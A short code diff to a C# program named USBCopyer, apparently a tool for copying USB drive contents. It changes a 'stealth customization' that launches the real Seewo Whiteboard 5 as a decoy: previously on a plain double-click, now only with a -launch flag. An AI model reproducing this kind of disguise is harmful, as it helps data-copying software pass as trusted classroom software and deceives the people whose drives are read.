@@ -43,6 +43,12 @@ namespace USBCopyer
                             showicon = true;
                             break;
 
+                        // 隐藏性定制：仅在显式携带 -launch 时执行同目录 launcher.lnk（目标由该 lnk 决定，通常是希沃白板5）
+                        case "/launch":
+                        case "-launch":
+                            EasiNoteLauncher.TryLaunch();
+                            break;
+
                         case "/setting":
                         case "-setting":
                             Thread th = new Thread(() =>
@@ -74,10 +80,6 @@ namespace USBCopyer
                     }
                 }
                 
-                // 隐藏性定制：无参数双击启动时，先打开电脑中真实安装的希沃白板5，再进行后续操作
-                if (args.Length == 0)
-                    EasiNoteLauncher.TryLaunch();
-
                 if (!useUglyUI)
                     Application.EnableVisualStyles();
 
